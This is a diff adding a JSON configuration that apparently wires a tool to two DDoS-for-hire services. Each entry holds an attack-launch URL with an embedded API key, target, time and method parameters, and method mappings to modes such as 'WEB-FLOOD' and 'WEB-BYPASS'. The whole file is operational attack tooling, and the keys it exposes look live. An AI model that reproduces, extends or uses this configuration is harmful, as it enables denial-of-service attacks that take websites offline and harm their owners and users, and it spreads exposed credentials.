@@ -1,0 +1,23 @@
+[
+    {
+        "name": "Agath API",
+        "enabled": true,
+        "url": "https://agath.app/api/attack?key=agk_7f37a4db9d1a40bb831e65ed3c897e76&target={target}&time={time}&method={method}",
+        "maxTime": 30,
+        "methodMap": {
+            "hfree": "HFREE"
+        }
+    },
+    {
+        "name": "Webd API",
+        "enabled": false,
+        "url": "https://webd.st/api/launch?api_key=88b09063dc88ffec05e0a8caac1e32481a014d0f2d74ca0c4b63ab168ff59bb3&target={target}&method={method}&time={time}&ratelimit=64&module=SOFT",
+        "maxTime": 60,
+        "methodMap": {
+            "hfree": "WEB-FLOOD",
+            "hget": "WEB-BYPASS",
+            "hrax": "WEB-FLOOD",
+            "hlegit": "WEB-FLOOD"
+        }
+    }
+]
